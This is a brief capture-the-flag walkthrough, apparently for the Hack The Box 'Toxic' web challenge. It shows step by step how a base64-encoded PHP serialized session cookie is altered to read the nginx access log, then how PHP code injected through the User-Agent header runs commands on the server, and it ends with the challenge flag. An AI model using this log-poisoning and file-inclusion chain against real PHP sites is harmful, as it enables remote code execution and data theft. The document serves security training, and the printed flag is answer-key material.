#https://dwbruijn.github.io/HTB-Toxic/

'''
echo Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9|base64 -d;echo
O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}

From the response header, we found it is a nginx server.

echo 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}' | base64
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo=

Got 188.166.151.80 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" 188.166.151.80 - 200 "GET /favicon.ico HTTP/1.1" "http://188.166.151.80:30877/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"

User Agent will be loaded as PHP code, so we can inject <?php system('ls /'); ?> into User Agent

curl -H "User Agent = \"<?php system('ls /'); ?>\"" --cookie "PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo=" http://188.166.151.80:30877/

Found the flag file name is flag_X41cC

curl -H "User Agent = \"<?php system('cat /flag_X41cC'); ?>\"" --cookie "PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo=" http://188.166.151.80:30877/
Seems no read privilige...

echo 'O:9:"PageModel":1:{s:4:"file";s:11:"/flag_X41cC";}' | base64
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfWDQxY0MiO30K

curl  --cookie "PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfWDQxY0MiO30K" http://188.166.151.80:30877/

HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}
'''
